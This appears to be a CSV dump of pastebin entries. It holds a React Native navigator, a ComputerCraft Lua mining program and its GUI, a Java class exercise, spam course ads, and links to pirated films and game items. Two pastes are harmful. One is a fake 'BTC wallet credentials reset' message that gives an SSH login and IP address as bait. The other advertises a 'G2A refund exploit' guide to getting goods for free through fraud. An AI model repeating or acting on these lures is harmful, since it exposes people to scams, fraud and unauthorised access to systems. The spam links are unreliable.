id,title,username,language,date,content
nTNUZJ9h,Untitled,krintax,TypeScript,Sunday 17th of December 2023 11:56:19 AM CDT,"const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();

const DEFAULT_TAB_OPTIONS = {
  headerShown: false,
  tabBarLabel: '',
  tabBarActiveTintColor: '#ffffff',
  tabBarInactiveTintColor: '#7E8EA3',
};

const AuthenticatedTabNavigator = () => {
  const {theme} = useTheme();
  return (
    <Tab.Navigator
      screenOptions={{
        tabBarStyle: {
          padding: 16,
          height: 72,
          backgroundColor: `${theme.BACKGROUND_POST}`,
        },
      }}>
      <Tab.Screen
        name=""Home""
        component={HomeScreen}
        options={{
          tabBarIcon: ({color}) => <Icon name={'home'} color={color} />,

          ...DEFAULT_TAB_OPTIONS,
        }}
      />
      {/*  Removed other screens*/}
    </Tab.Navigator>
  );
};

const UnauthenticatedNavigator = () => {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen name=""GetStartedScreen"" component={GetStartedScreen} />
      {/*  Removed other screens*/}
    </Stack.Navigator>
  );
};

function OnboardingNavigator() {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen
        name=""EmailConfirmationScreen""
        component={EmailConfirmationScreen}
      />
    </Stack.Navigator>
  );
}

const AuthenticatedNavigator = () => {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen name=""HomeTab"" component={AuthenticatedTabNavigator} />
      <Stack.Screen
        name=""ChangePasswordScreen""
        component={ChangePasswordScreen}
      />
      {/*  Removed other screens*/}
    </Stack.Navigator>
  );
};

const Navigator = () => {
  const {isSignedIn, user} = useAuth();

  if (isSignedIn) {
    return user.emailConfirmed ? (
      <AuthenticatedNavigator />
    ) : (
      <OnboardingNavigator />
    );
  }

  return <UnauthenticatedNavigator />;
};

export default Navigator;"
R9M583sD,Untitled,sissou123,Python,Sunday 17th of December 2023 11:48:11 AM CDT,"Data Science: Modern Deep Learning in Python
Build with modern libraries like Tensorflow, Theano, Keras, PyTorch, CNTK, MXNet. Train faster with GPU on AWS.
for more:https://dz-linkk.com/K71lO"
UCuLy2W8,Untitled,sissou123,Python,Sunday 17th of December 2023 11:35:25 AM CDT,"Machine Learning, Data Science and Generative AI with Python
Complete hands-on machine learning and AI tutorial with data science, Tensorflow, GPT, OpenAI, and neural networks
for more:https://dz-linkk.com/jPvq5"
QXJrcgYF,branch.lua,aegouihaegouha4gouha,Lua,Sunday 17th of December 2023 11:29:40 AM CDT,"-- branch.lua
-- branch program
-- special ggOS Turtle edition

local isProgRunning = true
local hasStarted = false
local isRunning=false
local isStopped=true
local x=0
local y=0
local z=0
local d=0
local intervals = 1000000

os.loadAPI(""/ggOS/gg.lua"")
-- if branch design dir not exists, create
local isLoad = true
if not fs.isDir(""bd"") then 
	fs.makeDir(""bd"")
end

function cwrite(msg,colr,bgcolor)
    local sc = term.getTextColor()
	local sbc = term.getBackgroundColor()
    term.setTextColor(colr)
	if bgcolor ~= nil then 
		term.setBackgroundColor(bgcolor)
	end
    write(msg)
    term.setTextColor(sc)
	term.setBackgroundColor(sbc)
end

function statusUpdate(st)
	local stx, sty = term.getCursorPos()
	term.setCursorPos(32,1)
	write(""        "")
	term.setCursorPos(32,1)
	if st == ""RUNNING"" then
		cwrite("" RUNNING"", colors.green)
	elseif st == ""STOPPED"" then
		cwrite("" STOPPED"", colors.red)
	elseif st == ""RESUMING"" then
		cwrite(""RESUMING"", colors.orange)
	elseif st == ""STOPPING"" then
		cwrite(""STOPPING"", colors.orange)
	elseif st == ""OFF"" then
		cwrite(""     OFF"", colors.gray)
	end
	
	term.setCursorPos(stx,sty)
end

local currTermBg = term.getBackgroundColor()
local currTermTx = term.getTextColor()
term.setBackgroundColor(colors.black)
term.setTextColor(colors.white)
term.clear()

term.setCursorPos(1,1)
print(""Branch Miner"")
term.setCursorPos(17,1)
cwrite("" START "", colors.green, colors.gray)
-- monitor 39x19
statusUpdate(""OFF"")
term.setCursorPos(1,3)
print(""x: 0, y: 0, z: 0\n"")
write(""Z: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)
write(""\nY: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)
write(""\nD: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)

term.setCursorPos(8,5)
gg.cwrite(""Load"", colors.black, colors.blue)
term.setCursorPos(14,5)
gg.cwrite(""Save"", colors.blue, colors.black)

function drawLoad()
	term.setCursorPos(8,5)
	gg.cwrite(""Load"",colors.black,colors.blue)
	term.setCursorPos(14,5)
	gg.cwrite(""Save"",colors.blue,colors.black)
	term.setCursorPos(8,7)
	cwrite("" 1  2  3  4"", colors.red)
	term.setCursorPos(8,8)
	cwrite("" 5  6  7  8"", colors.red)
	term.setCursorPos(8,9)
	cwrite("" 9 10 11 12"", colors.red)
	term.setCursorPos(8,10)
	cwrite(""13 14 15 16"", colors.red)
end

function drawSave()
	term.setCursorPos(8,5)
	gg.cwrite(""Load"",colors.blue,colors.black)
	term.setCursorPos(14,5)
	gg.cwrite(""Save"",colors.black,colors.blue)
	term.setCursorPos(8,7)
	cwrite("" 1  2  3  4"", colors.green)
	term.setCursorPos(8,8)
	cwrite("" 5  6  7  8"", colors.green)
	term.setCursorPos(8,9)
	cwrite("" 9 10 11 12"", colors.green)
	term.setCursorPos(8,10)
	cwrite(""13 14 15 16"", colors.green)
end

drawLoad()

term.setCursorPos(1,12)
write(""Repeats: "")
write(""<"")
gg.cwrite(""+"",colors.green,colors.gray)
write(""  x  "")
gg.cwrite(""-"",colors.red,colors.gray)
write("">"")

local fuelstr = ""Fuel: "" .. turtle.getFuelLevel()
term.setCursorPos(40-#fuelstr,2)
write(fuelstr)
term.setCursorPos(28,4)
gg.cwrite(""Exit Program"", colors.white, colors.red)


-- note: this looks inverted to what turtle sees
-- bdesign rows need to have odd number of items


local bdesign = {}
bdesign[1] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
bdesign[2] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
bdesign[3] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}

local bdesignCenter = (#bdesign[1]-1)/2+1

function drawDesign()
	for i=1, 9 do
		term.setCursorPos(40-19,14-i)
		if i <= #bdesign then
			for j=1, #bdesign[i] do
				cwrite("" "", colors.white, (bdesign[i][j] == 1 and colors.green or colors.gray))
			end
		else
			cwrite(""                   "", colors.white, colors.lightGray)
		end
	end
end

drawDesign()

term.setCursorPos(1,13)
write(""Branch Rows: "")
cwrite(""+"",colors.green,colors.gray)
write("" ""..#bdesign.."" "")
cwrite(""-"", colors.red,colors.gray)


function control()
	local event, button, mousex, mousey = os.pullEvent(""mouse_click"")
	
	if mousex >= 17 and mousex <= 23 and mousey == 1 then
		-- start/pause button
		if not hasStarted then
			term.setCursorPos(1,5)
			write(""     \n     \n     "")
		end
		if isRunning then
			term.setCursorPos(17,1)
			cwrite("" START "", colors.green, colors.gray)
			statusUpdate(""STOPPING"")
		else
			term.setCursorPos(17,1)
			cwrite("" PAUSE "", colors.red, colors.gray)
			statusUpdate(""RESUMING"")
		end
		isRunning = not isRunning
	elseif mousex >= 28 and mousex <= 39 and mousey == 4 then
		-- exit program (run startup)
		isProgRunning = false
		term.clear()
		term.setCursorPos(1,1)
		print(""Returning to program list..."")
		term.setBackgroundColor(currTermBg)
		term.setTextColor(currTermTx)
		shell.exit()
	elseif mousex >= 8 and mousex <= 11 and mousey == 5 then
		-- load button
		drawLoad()
		isLoad = true
	elseif mousex >= 14 and mousex <= 17 and mousey == 5 then
		-- save button
		drawSave()
		isLoad = false
	elseif mousex >= 8 and mousex <= 18 and mousey >= 7 and mousey <= 10 then
		-- save/load branch designs
		-- row is column and column is row haha
		local row = mousex-7
		local column = mousey - 6
		if row % 3 ~= 0 then -- in case click in space btwn numbers
			row = (row + 3 - row % 3) / 3
		else row = 0 end
		
		local n = tostring((column - 1) * 4 + row)

		local paddedN = """"
		for i=1, 2-#n do
			paddedN = paddedN .. "" ""
		end
		paddedN = paddedN .. n
		if row ~= 0 then
			if isLoad then
				-- load
				if fs.exists(""bd/"" .. n .. "".design"") then
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.black, colors.red)
				sleep(0.1)
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.red, colors.black)
				term.setCursorPos(21,4)
				write(paddedN)
				local h = fs.open(""bd/"" .. n .. "".design"", ""r"")
				bdesign = textutils.unserialize(h.readAll())
				h.close()
				drawDesign()
				term.setCursorPos(16,13)
				write(#bdesign)
				end
			else
				-- save
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.black, colors.green)
				sleep(0.1)
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.green, colors.black)
				term.setCursorPos(21,4)
				write(paddedN)
				local h = fs.open(""bd/"" .. n .. "".design"", ""w"")
				h.write(textutils.serialize(bdesign))
				h.close()
			end
		end
	elseif mousex >= 21 and mousex <= 39 and mousey >= 5 and mousey <= 13 then
		-- changing branch pattern
		if isStopped then
			-- only update when turtle is stopped
			if mousex ~= 30 then
				-- cannot modify the middle layer
				
				-- convert mouse coords to bdesign coords
				local bdx = mousex - 20
				local bdy = 14 - mousey
				if bdy <= #bdesign then
					bdesign[bdy][bdx] = (bdesign[bdy][bdx] == 0 and 1 or 0)
					term.setCursorPos(mousex,mousey)
					cwrite("" "", colors.white, (bdesign[bdy][bdx] == 1 and colors.green or colors.gray))
				end
			end
		end
	elseif mousex == 4 and mousey == 5 and not hasStarted then
		turtle.forward()
	elseif mousex == 5 and mousey == 5 and not hasStarted then
		turtle.back()
	elseif mousex == 4 and mousey == 6 and not hasStarted then
		turtle.up()
	elseif mousex == 5 and mousey == 6 and not hasStarted then
		turtle.down()
	elseif mousex == 4 and mousey == 7 and not hasStarted then
		turtle.turnRight()
	elseif mousex == 5 and mousey == 7 and not hasStarted then
		turtle.turnLeft()
	elseif mousex == 14 and mousey == 13 then
		-- increase rows
		if #bdesign < 9 and isStopped then
			bdesign[#bdesign+1] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
			term.setCursorPos(16,13)
			write(#bdesign)
			term.setCursorPos(40-#bdesign[1],14-#bdesign)
			for i=1, #bdesign[#bdesign] do
				cwrite("" "", colors.white, (bdesign[#bdesign][i] == 1 and colors.green or colors.gray))
			end
		end
	elseif mousex == 18 and mousey == 13 then
		-- decrease rows
		if #bdesign > 1 and isStopped then
			term.setCursorPos(40-#bdesign[1],14-#bdesign)
			for i=1, #bdesign[#bdesign] do
				cwrite("" "", colors.white, colors.lightGray)
			end
			bdesign[#bdesign] = nil
			term.setCursorPos(16,13)
			write(#bdesign)
		end
	end
	if isProgRunning then control() end
end

function checkInv() 
	if turtle.getItemSpace(16) ~= 64 then
		-- inventory full. return to home base
		-- save current position and direction
		local sx = x
		local sy = y
		local sz = z
		local sd = d
		
		if x ~= 0 then
			-- not in main hall
			goDir(x < 0 and ""right"" or ""left"")
			while x ~= 0 do
				tFwd()
			end
		end
		
		-- empty inventory and come back to original pos and direction
		goDir(""backward"")
		while z ~= 0 do
			
			tFwd()
		end
		goDir(""left"")
		tFwd()
		
		for p=2,16 do
        turtle.select(p)
        turtle.dropDown()
        end
        turtle.select(1)
		
		goDir(""right"")
		tFwd()
		goDir(""forward"")
		while z ~= sz do
			tFwd()
		end
		
		goDir(sx < 0 and ""left"" or ""right"")
		while x ~= sx do
			tFwd()
		end
		goDir(sd)
	end
end

function main() 
	--local bdx = mousex - 20
	--local bdy = 14 - mousey
	if isRunning then
		
		statusUpdate(""RUNNING"")
		isStopped = false
		for i=1, #bdesign do
			
			tbtdig()
			if z % 4 == 0 then
				turtle.select(1)
				if turtle.getItemDetail().name == ""minecraft:torch"" then turtle.placeDown() end
			end
			local j = bdesignCenter
			term.setCursorPos(39-19+j,14-i)
			cwrite("" "",colors.white,colors.purple)
			if i > 1 then
				term.setCursorPos(39-19+j,15-i)
				cwrite("" "",colors.white,colors.yellow)
			end
			-- check if left block can be destroyed
			-- if so, start loop to destroy all
			-- blocks to left are gone
			if bdesign[i][j-1] == 1 then
				goDir(""left"")
				while j - 1 > 0 and bdesign[i][j-1] == 1 do
					tbtdig()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j - 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
				goDir(""right"")
				while j < bdesignCenter do
					tFwd()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j + 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
			end
			if bdesign[i][j+1] == 1 then
				goDir(""right"")
				while j + 1 < #bdesign[i] and bdesign[i][j+1] == 1 do
					tbtdig()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j + 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
				goDir(""left"")
				while j > bdesignCenter do
					tFwd()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j - 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
			end
			goDir(""forward"")
		end
		drawDesign()
	else
		
		statusUpdate(""STOPPED"")
		isStopped = true
		sleep(1)
	end
	if isProgRunning then main() end
end

function goDir(desiredDir)
	if desiredDir == ""forward"" then desiredDir = 0
	elseif desiredDir == ""right"" then desiredDir = 1
	elseif desiredDir == ""backward"" then desiredDir = 2
	elseif desiredDir == ""left"" then desiredDir = 3
	end
	if d ~= desiredDir then
		if d > desiredDir then
			-- special case
			if d == 3 and desiredDir == 0 then turtle.turnRight()
			else
				for k=1, d-desiredDir do turtle.turnLeft() end
			end
		else
			if d == 0 and desiredDir == 3 then turtle.turnLeft()
			else
				for k=1, desiredDir-d do turtle.turnRight() end
			end
		end
		d = desiredDir
	end
end

function updatePOS(goin)
	if goin == 0 then
		if d == 0 then z = z + 1
		elseif d == 1 then x = x + 1
		elseif d == 2 then z = z - 1
		elseif d == 3 then x = x - 1
		end
	end
	term.setCursorPos(1,3)
	term.clearLine()
	print(""x: ""..x.."", y: ""..y.."", z: ""..z)
end

-- dig a 1x1x3 column in front of turtle
function tbtdig()
    turtle.dig()
    checkInv()
    tFwd()
    turtle.digUp()
    checkInv()
    turtle.digDown()
    checkInv()
end

function tFwd()
    local isRed = true
    while not turtle.forward() do
		turtle.dig()
		term.setCursorPos(1,2)
		if isRed then
			cwrite(""something is in the way!!"", colors.red)
			isRed = false
		else
			cwrite(""something is in the way!!"", colors.yellow)
			isRed = true
		end
    end
	term.setCursorPos(1,2)
	write(""                         "")
	updatePOS(0)
end

parallel.waitForAll(main, control)
"
G1pGacSj,startup.lua,aegouihaegouha4gouha,Lua,Sunday 17th of December 2023 11:28:45 AM CDT,"-- startup.lua
term.setBackgroundColor(colors.lightBlue)
term.setTextColor(colors.black)
term.clear()
term.setCursorPos(1,1)
os.loadAPI(""ggos/gg.lua"")
print(""eee"")
local endermodem = peripheral.wrap(""top"")
local inProgram = false
-- 39x13

-- define buttons
local buttons = {
	desktop = {
		settings = {
			x1    = 14,
			x2    = 25,
			y1    = 8,
			y2    = 10,
		},
		programs = {
			x1    = 3,
			x2    = 14,
			y1    = 3,
			y2    = 5,
		},
		network = {
			x1    = 17,
			x2    = 27,
			y1    = 4,
			y2    = 6,
		},
		
		
	},
	settings = {
		close = {
			x1    = 37,
			x2    = 39,
			y1    = 2,
			y2    = 2,
		},
	},
	programs = {
		close = {
			x1    = 37,
			x2    = 39,
			y1    = 2,
			y2    = 2,
		},
		branch = {
			x1 = 3,
			x2 = 8,
			y1 = 5,
			y2 = 5,
		}
	}
}

local gui = {
	desktop = {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1 = 3,
			x2 = 14,
			y1 = 3,
			y2 = 5,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1 = 17,
			x2 = 27,
			y1 = 4,
			y2 = 6,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1 = 14,
			x2 = 25,
			y1 = 8,
			y2 = 10,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1    = 15,
			x2    = 15,
			y1    = 9,
			y2    = 9,
			txt   = "" Settings "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 4,
			x2    = 4,
			y1    = 4,
			y2    = 4,
			txt   = "" Programs "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 18,
			x2    = 4,
			y1    = 5,
			y2    = 5,
			txt   = "" Network "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
	},
	settings = {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1 = 1,
			x2 = 39,
			y1 = 2,
			y2 = 13,
			txt = false,
			bgcolor = colors.lightGray,
		},
		{
			x1 = 37,
			x2 = 37,
			y1 = 2,
			y2 = 2,
			txt = "" X "",
			color = colors.black,
			bgcolor = colors.red,
		},
		{
			x1 = 2,
			x2 = 2,
			y1 = 3,
			y2 = 3,
			txt = ""ID: "" .. os.getComputerID(),
			color = colors.black,
			bgcolor = colors.lightGray
		},
		{
			x1 = 2,
			x2 = 2,
			y1 = 4,
			y2 = 4,
			txt = ""Name: "",
			color = colors.black,
			bgcolor = colors.lightGray
		},
		{
			x1 = 8,
			x2 = 8,
			y1 = 4,
			y2 = 4,
			txt = ""            "",
			color = colors.black,
			bgcolor = colors.white
		},
	},
	programs =  {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1 = 1,
			x2 = 39,
			y1 = 2,
			y2 = 13,
			txt = false,
			bgcolor = colors.lime,
		},
		{
			x1 = 37,
			x2 = 37,
			y1 = 2,
			y2 = 2,
			txt = "" X "",
			color = colors.black,
			bgcolor = colors.red,
		},
		{
			x1=2,
			x2=2,
			y1=3,
			y2=3,
			txt = ""Programs"",
			color = colors.black,
			bgcolor = colors.lime,
		},
		{
			x1=3,
			x2=3,
			y1=5,
			y2=5,
			txt = ""Branch"",
			color = colors.black,
			bgcolor = colors.lime,
		},
		{
			x1=3,
			x2=3,
			y1=7,
			y2=7,
			txt = ""Maps"",
			color = colors.black,
			bgcolor = colors.lime,
		},
	}
}

local currPage = ""programs""


function btnFunc (page, ibtn, mousebtn) 
	if page == ""desktop"" then
		if ibtn == ""settings"" and mousebtn == 1 then
			-- settings
			currPage = ""settings""
			drawGUI(currPage)
		elseif ibtn == ""programs"" and mousebtn == 1 then
			-- programs
			currPage = ""programs""
			drawGUI(currPage)
		elseif ibtn == ""network"" and mousebtn == 1 then
			-- network

		end
	elseif page == ""settings"" then
		if ibtn == ""close"" and mousebtn == 1 then
			-- desktop (close)
			currPage = ""desktop""
			drawGUI(currPage)
		end
	elseif page == ""programs"" then
		if ibtn == ""close"" and mousebtn == 1 then
			-- desktop (close)
			currPage = ""desktop""
			drawGUI(currPage)
		elseif ibtn == ""branch"" and mousebtn == 1 then
			inProgram = true
			shell.run(""/branch.lua"")
			inProgram = false
			drawGUI(currPage)
		end

	end
end

-- function to draw gui
function drawGUI(page) 
	term.clear()
	for k,v in pairs (gui[page]) do
		--term.setCursorPos(13,1)
		--term.clearLine()
		--print(""k: "" .. k .. "", v: "" .. v)
		for i=v.y1, v.y2 do
			term.setCursorPos(v.x1,i)
			if v.txt then
				term.setCursorPos(v.x1,v.y1)
				gg.cwrite(v.txt, v.color, v.bgcolor)
			else
				for j=v.x1, v.x2 do
					gg.cwrite("" "", colors.black, v.bgcolor)
				end
			end
		end
	end
end

drawGUI(currPage)




function main ()
	if isRunning then
		
		sleep(1)
	else
		sleep(1)
	end
	if not inProgram then 
		term.setCursorPos(36,1)
		gg.cwrite(gg.fuel(true),colors.white,colors.gray) 
	end
	main()
end

function control ()
	local event, button, mousex, mousey = os.pullEvent(""mouse_click"")
	for k,v in pairs (buttons[currPage]) do
		if mousex >= v.x1 and mousex <= v.x2 and mousey >= v.y1 and mousey <= v.y2 then
			term.setCursorPos(18,1)
			write(""key: "" .. k)
			btnFunc(currPage,k, button)
		end
	end
	
	control()
end

parallel.waitForAll(main, control)"
vkKdkXri,Untitled,sissou123,Python,Sunday 17th of December 2023 11:23:07 AM CDT,"Python for Machine Learning & Data Science Masterclass
Learn about Data Science and Machine Learning with Python! Including Numpy, Pandas, Matplotlib, Scikit-Learn and more!
for more:https://dz-linkk.com/4eINGS"
hWVJKb8X,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Sunday 17th of December 2023 11:07:40 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-198811"
cMRJJ2Xq,poo test2,STANAANDREY,Java,Sunday 17th of December 2023 10:42:27 AM CDT,"
abstract class Task {
    protected String name;

    public Task(final String name) {
        this.name = name;
    }

    public abstract boolean execute(double time);
}

class SimpleTask extends Task {
    private double necTime;

    public SimpleTask(final String name, double necTime) {
        super(name);
        this.necTime = necTime;
    }

    @Override
    public boolean execute(double time) {
        if (time >= necTime) {
            necTime = 0;
            return true;
        }
        necTime -= time;
        return false;
    }

    @Override
    public String toString() {
        return ""Name: "" + name + "", Time: "" + necTime + "";"";
    }
}

class ComposedTask extends Task {
    private SimpleTask[] simpleTasks;

    public ComposedTask(final String name, SimpleTask[] simpleTasks) {
        super(name);
        this.simpleTasks = simpleTasks;
    }

    @Override
    public boolean execute(double time) {
        double q = time / simpleTasks.length;
        boolean finished = true;
        for (int i = 0; i < simpleTasks.length; i++) {
            finished &= simpleTasks[i].execute(q);
        }
        return finished;
    }

    @Override
    public String toString() {
        String s = ""Name: "" + name + "", COntent: ("";
        for (int i = 0; i < simpleTasks.length; i++) {
            s += simpleTasks[i] + "" "";
        }
        return s + "")"";
    }
}

class Processor {
    private Task[] tasks;

    public Processor(Task[] tasks) {
        this.tasks = tasks;
    }

    public void finishAllTasks() {
        boolean finished = false;
        while (!finished) {
            finished = true;
            for (int i = 0; i < tasks.length; i++) {
                finished &= tasks[i].execute(5);
            }
        }
    }

    @Override
    public String toString() {
        String s = ""Proc: "";
        for (int i = 0; i < tasks.length; i++) {
            s += tasks[i] + ""; "";
        }
        return s;
    }
}

public class Main {
    public static void main(String[] args) {
        var st1 = new SimpleTask(""st1"", 5);
        var st2 = new SimpleTask(""st2"", 10);
        var ct = new ComposedTask(""ct"", new SimpleTask[]{st1, st2});
        var p = new Processor(new Task[]{ct});
        System.out.println(p);
        p.finishAllTasks();
        System.out.println(p);
    }
}
"
H1xxQe1q,G2A Refund Exploit Dec 2023,G2ARefundExploit,GetText,Sunday 17th of December 2023 09:54:55 AM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view#g2a_refund_exploit.pdf

Working as of 
13 December 2023

529133"
29q262cu,Untitled,Locative,SQL,Sunday 17th of December 2023 09:52:19 AM CDT,"Список  предметов: 
https://db.pandawow.me/?item=133543
https://db.pandawow.me/?item=118676
https://db.pandawow.me/?item=129923
https://db.pandawow.me/?item=116771
https://db.pandawow.me/?item=166775
https://db.pandawow.me/?item=137573
https://db.pandawow.me/?item=138387

https://db.pandawow.me/?item=113011
https://db.pandawow.me/?item=113007
https://db.pandawow.me/?item=113004
https://db.pandawow.me/?item=113024
https://db.pandawow.me/?item=113035
https://db.pandawow.me/?item=113047
https://db.pandawow.me/?item=113090
https://db.pandawow.me/?item=113087
https://db.pandawow.me/?item=113083
https://db.pandawow.me/?item=113077

https://db.pandawow.me/?item=84101
https://db.pandawow.me/?item=87791
https://db.pandawow.me/?item=44175
https://db.pandawow.me/?item=45801
https://db.pandawow.me/?item=54860
https://db.pandawow.me/?item=46778
https://db.pandawow.me/?item=49283
https://db.pandawow.me/?item=52200
https://db.pandawow.me/?item=76755
https://db.pandawow.me/?item=71718
https://db.pandawow.me/?item=85870
https://db.pandawow.me/?item=78924
https://db.pandawow.me/?item=78919

https://db.pandawow.me/?item=38301
https://db.pandawow.me/?item=44719
https://db.pandawow.me/?item=38578
https://db.pandawow.me/?item=46780
https://db.pandawow.me/?item=49703
https://db.pandawow.me/?item=52253
https://db.pandawow.me/?item=52201
https://db.pandawow.me/?item=52251
https://db.pandawow.me/?item=52489
https://db.pandawow.me/?item=64488
https://db.pandawow.me/?item=72161
https://db.pandawow.me/?item=69776
https://db.pandawow.me/?item=70159
https://db.pandawow.me/?item=86574
https://db.pandawow.me/?item=88566
https://db.pandawow.me/?item=90067
https://db.pandawow.me/?item=33079
https://db.pandawow.me/?item=33219
https://db.pandawow.me/?item=32542
https://db.pandawow.me/?item=35227

https://db.pandawow.me/?item=95474
https://db.pandawow.me/?item=95475
https://db.pandawow.me/?item=97213

https://db.pandawow.me/?item=87526
https://db.pandawow.me/?item=89686
https://db.pandawow.me/?item=90173
https://db.pandawow.me/?item=90897
https://db.pandawow.me/?item=90953
https://db.pandawow.me/?item=85220
https://db.pandawow.me/?item=60847
https://db.pandawow.me/?item=22780
https://db.pandawow.me/?item=20651
https://db.pandawow.me/?item=46892
https://db.pandawow.me/?item=62540
https://db.pandawow.me/?item=64996
https://db.pandawow.me/?item=66067
https://db.pandawow.me/?item=68385
https://db.pandawow.me/?item=69847
https://db.pandawow.me/?item=69239
https://db.pandawow.me/?item=69251
https://db.pandawow.me/?item=68840
https://db.pandawow.me/?item=70140
https://db.pandawow.me/?item=70099
https://db.pandawow.me/?item=69992
https://db.pandawow.me/?item=70160
https://db.pandawow.me/?item=71726
https://db.pandawow.me/?item=79744
https://db.pandawow.me/?item=78916"
5Z2TXfTK,Untitled,sissou123,Python,Sunday 17th of December 2023 09:22:54 AM CDT,"The Data Science Course: Complete Data Science Bootcamp 2023
Complete Data Science Training: Mathematics, Statistics, Python, Advanced Statistics in Python, Machine & Deep Learning
for more:https://dz-linkk.com/CJtUKw"
bqr57NKP,dbftnfn,gadungw71,PHP,Sunday 17th of December 2023 09:13:12 AM CDT,"https://groups.google.com/g/erterdgh/c/-2GZ0Pei4R4
https://groups.google.com/g/alt.windows-xp/c/Z0TdIAZGsgg
https://www.taskade.com/p/izle-nefes-yer-eksi-iki-full-filmler-online-hd-1080-p-01HHTZ7T39A1QFXXM80E0EW6X0
https://baskadia.com/post/1q82s
https://vk.com/@piscesarya-tum-film-nefes-yer-eksi-iki-izle-2023-turkce-dublaj-full-h
https://vk.com/@blogchinemax-nefes-yer-eksi-iki-filmi-full-izle-2023-bihter-1080p-turkce
https://vk.com/@mopieboxoffice-filmi-izle-nefes-yer-eksi-iki-2023-tam-surum-turkce-altyazl
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/Xc2D4C4XrhU
https://groups.google.com/g/comp.os.minix/c/nu4CTglDlsM
https://www.taskade.com/p/izle-filmleri-nefes-yer-eksi-iki-full-filmler-online-hd-1080-p-01HHV039QPA8EGRZYJKX330B3E
https://baskadia.com/post/1q8af
https://groups.google.com/g/alt.windows-xp/c/jDXWbrZ-rew
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/aVXOd_L2sqw
https://groups.google.com/g/comp.os.minix/c/MXtSfPWg_pI
https://www.taskade.com/p/tuem-film-oeluemlue-duenya-2-2023-tuerkce-dublaj-full-hd-izle-01HHV1RT1PA52MF0P5GCR37XAM
https://baskadia.com/post/1q8qs
https://vk.com/@chinahade-film-olumlu-dunya-2-2023-stream-turkce-dublaj-tum-film
https://vk.com/@watchstylleronline-izle-filmleri-olumlu-dunya-2-full-filmler-online-hd-1080p
https://groups.google.com/g/alt.windows-xp/c/_yq0QGv7iU4
https://groups.google.com/a/chromium.org/g/chromium-reviews/c/yNpsxq4Fgtk
https://groups.google.com/g/comp.os.minix/c/q8ggqOxUnNE
https://vk.com/@optimummm-film-murat-gogebakan-kalbim-yaral-2023-stream-turkce-dublaj
https://vk.com/@filmchinemax-murat-gogebakan-kalbim-yaral-filmi-tam-surum-2023hd-turkce-d
https://vk.com/@674475936-murat-gogebakan-kalbim-yaral-2023-film-izle-turkce-dublaj-fu
https://baskadia.com/post/1qihs
https://groups.google.com/g/esdgfg/c/asJmV9kknZQ
